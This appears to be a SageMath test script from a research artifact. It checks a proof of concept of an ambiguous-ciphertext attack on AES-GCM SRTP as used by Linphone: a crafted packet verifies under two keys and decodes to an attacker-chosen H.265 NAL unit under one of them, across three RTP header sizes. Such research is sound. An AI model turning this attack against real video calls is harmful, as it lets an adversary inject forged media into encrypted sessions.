"""Round-trip test of the per-packet ambiguous-ciphertext attack with
AAD = RTP fixed header (+CSRC), matching Linphone's inner-encryption
binding (paper App. C eq. 20-21, RFC 8723 §2.1 with extension excluded).

Three CC scenarios are exercised:
  - CC=0   12-byte AAD  — the common Linphone single-source case
  - CC=1   16-byte AAD  — exactly one full GHASH block
  - CC=2   20-byte AAD  — straddles two GHASH blocks (forces 16-byte
                          padding in the AAD GHASH input)

For each CC we craft an ambiguous ciphertext under (K_OLD, K_NEW) with
the AAD bound to *both* keys, then:
  - decrypt_and_verify under K_OLD: succeeds, recovers the laid-out
    plaintext, and the H.265 NAL parser yields the adversary NAL
    byte-for-byte;
  - decrypt_and_verify under K_NEW: also succeeds (same tag), but
    the recovered first NAL is not the adversary NAL.

We additionally confirm that **using the wrong AAD on the receiver side
breaks tag verification** under both keys (CC=0 ciphertext + CC=2 AAD
must fail). This is paper Cond. 4 (Absence of authenticated KID) in
action: the keys are interchangeable but the AAD-bound RTP header is
required for tag validity.
"""

from binascii import hexlify, unhexlify
from Crypto.Cipher import AES

load('attack/crypto/util.sage')
load('attack/crypto/gcm.sage')
load('attack/crypto/srtp_kdf.sage')
load('attack/crypto/h265_nal.sage')
load('attack/crypto/rtp_header.sage')
load('attack/crypto/test_packet_ambiguous.sage')


MTU_PAYLOAD = 1300


def gcm_decrypt(k_enc: bytes, nonce12: bytes, aad: bytes,
                ciphertext: bytes, tag16: bytes):
    """Wrapper that returns (plaintext, ok) — no exception on tag fail."""
    cipher = AES.new(k_enc, AES.MODE_GCM, nonce=nonce12)
    if aad:
        cipher.update(aad)
    try:
        pt = cipher.decrypt_and_verify(ciphertext, tag16)
        return pt, True
    except ValueError:
        return None, False


def run_one(cc: int, nals, k_old, k_new, master_salt, ssrc, roc, seq):
    # Pick first NAL fitting MTU (TRAIL_R, VPS, SPS, PPS, PSEI).
    pick = None
    for nal in nals:
        nt = nal_type(nal[0])
        if nt in (0, 1, 32, 33, 34, 39) and len(nal) + 64 < MTU_PAYLOAD:
            pick = (nt, nal); break
    if pick is None:
        raise SystemExit("[-] no NAL fits the size constraint")
    nt, adversary_nal = pick

    csrcs = [0x10000000 + i for i in range(cc)]
    aad = build_rtp_header(payload_type=96, seq=seq, timestamp=0xdeadbeef,
                           ssrc=ssrc, csrcs=csrcs)
    assert len(aad) == 12 + 4 * cc

    pt, adj_off = build_packet_plaintext(adversary_nal)

    r = build_ambiguous_under_inner_keys(
        pt, k_old, k_new, master_salt, ssrc, roc, seq,
        adjustment_block_offset=adj_off,
        aad=aad,
    )

    print(f"\n  ── CC={cc}, AAD={len(aad)} B "
          f"({'12 B fixed' if cc==0 else f'12 B fixed + {4*cc} B CSRC'}) "
          f"── adversary NAL: type={nt} ({NAL_TYPE_NAMES.get(nt,'-')}), "
          f"{len(adversary_nal)} B ──")
    print(f"     AAD hex: {hexlify(aad).decode()}")
    print(f"     ciphertext: {len(r['ciphertext'])} B, "
          f"tag: {hexlify(r['tag16']).decode()}")

    # K_OLD: AAD must match → PASS
    pt_old, ok_old = gcm_decrypt(r["K_enc_old"], r["nonce_old"], aad,
                                 r["ciphertext"], r["tag16"])
    if not ok_old:
        raise SystemExit("[-] K_OLD verify FAILED with the matching AAD")
    parsed_old = split_nal_units(pt_old)
    if not parsed_old or parsed_old[0] != adversary_nal:
        raise SystemExit("[-] K_OLD recovered NAL differs from adversary NAL")
    print(f"     [+] K_OLD recovers adversary NAL bit-for-bit "
          f"({len(parsed_old[0])} B)")

    # K_NEW: same tag should verify → PASS, but the recovered first NAL
    # must NOT equal the adversary NAL.
    pt_new, ok_new = gcm_decrypt(r["K_enc_new"], r["nonce_new"], aad,
                                 r["ciphertext"], r["tag16"])
    if not ok_new:
        raise SystemExit("[-] K_NEW verify FAILED with the matching AAD")
    parsed_new = split_nal_units(pt_new)
    if parsed_new and parsed_new[0] == adversary_nal:
        raise SystemExit("[-] K_NEW would also decode the adversary NAL!")
    if parsed_new:
        nt_new = nal_type(parsed_new[0][0])
        print(f"     [+] K_NEW first NAL type={nt_new} differs from adversary "
              f"NAL → decoder will discard")
    else:
        print(f"     [+] K_NEW: no NAL parsable (best case)")

    # Wrong AAD path: should FAIL under both keys.
    wrong_aad = b"\x00" * len(aad)
    _, fail_old = gcm_decrypt(r["K_enc_old"], r["nonce_old"], wrong_aad,
                              r["ciphertext"], r["tag16"])
    _, fail_new = gcm_decrypt(r["K_enc_new"], r["nonce_new"], wrong_aad,
                              r["ciphertext"], r["tag16"])
    if fail_old or fail_new:
        raise SystemExit("[-] tag still verified with the wrong AAD — "
                         "this would violate the binding")
    print(f"     [+] wrong AAD rejected under both keys (binding intact)")


def main():
    path = "src-video/IMG_4388_main_1920x1440.h265"
    with open(path, "rb") as f:
        nals = split_nal_units(f.read())

    k_old = unhexlify("000102030405060708090a0b0c0d0e0f"
                     "101112131415161718191a1b1c1d1e1f")
    k_new = unhexlify("ffeeddccbbaa99887766554433221100"
                     "fedcba9876543210ffeeddccbbaa9988")
    # 12-byte master_salt (as Linphone passes via inner_send_key setter)
    master_salt = unhexlify("aabbccddeeff001122334455")
    ssrc, roc, seq = 0xdeadbeef, 0x00000007, 0x0042

    for cc in (0, 1, 2):
        run_one(cc, nals, k_old, k_new, master_salt, ssrc, roc, seq)

    print()
    print("[*] All CC scenarios PASS: ambiguous tag verifies under both "
          "K_OLD and K_NEW with the bound AAD, fails with the wrong AAD, "
          "and the K_OLD branch recovers the adversary NAL bit-for-bit.")


if __name__ == "__main__":
    main()
